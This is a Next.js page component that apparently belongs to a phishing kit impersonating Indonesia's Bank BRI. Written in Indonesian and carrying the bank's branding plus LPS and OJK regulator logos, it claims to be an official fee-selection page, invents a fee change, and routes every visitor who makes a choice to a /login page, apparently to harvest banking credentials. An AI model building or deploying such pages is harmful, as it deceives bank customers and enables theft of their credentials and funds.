import React from 'react'
import Image from 'next/image'

import banner from "../public/banner.jpeg"
import ojk from "../public/ojk.png"
import lps from "../public/lps.png"
import { useRouter } from 'next/router'
import {BsCheckLg} from 'react-icons/bs'

function Home() {

    const router = useRouter()

    const handleSubmit = (e) => {
        e.preventDefault()
        const checked = document.getElementById('tarif').value
        if (checked > 0) {
            router.push('/login')
        }

        return
    }
    return (
        <div className="container">
            <div className='container-flex'>
                <div style={{margin:'0 10px'}}>
                    <Image src={banner} height={400} alt="logo" />              
                </div>
                <div className='card'>
                  <h5 style={{textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:24, marginBottom: 3, marginTop:20}}>SELAMAT DATANG</h5>
                  <p style={{width:'90%', margin:'0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:14}}>Anda Berada Di Halaman Pemilihan Tarif Transaksi Bank BRI. Silahkan Pilih Tarif Transaksi Yang Anda Inginkan, Sesuai Dengan Kebutuan Anda</p>
                  <div style={{margin:'20px'}}>
                      <form onSubmit={handleSubmit}>
                          <label htmlFor='tarif' style={{color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:13}}>Silahkan Pilih Tarif Di Bawa ini</label>
                          <select id="tarif" className='form-control' style={{padding:10, border: '0.5px solid rgb(157, 199, 231)'}}>
                            <option value="0">Pilih Tarif (Klik disini)</option>
                            <option value="1"><BsCheckLg/> TARIF LAMA Rp6.500 pertransaksi</option>
                            <option value="2"><BsCheckLg/> TARIF BARU Rp150.000 Perbulanan Unlimited</option>
                          </select>
                          <button type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
                              Lanjut Aktivasi
                          </button>
                      </form>
                  </div>
                </div>
                <div style={{margin:'10px auto', display:'flex'}}>
                    <Image src={lps} width={100} height={50} alt="logo" />             
                    <Image src={ojk} width={100} height={50} alt="logo" />             
                </div>
            </div>
        </div>
    )
}

export default Home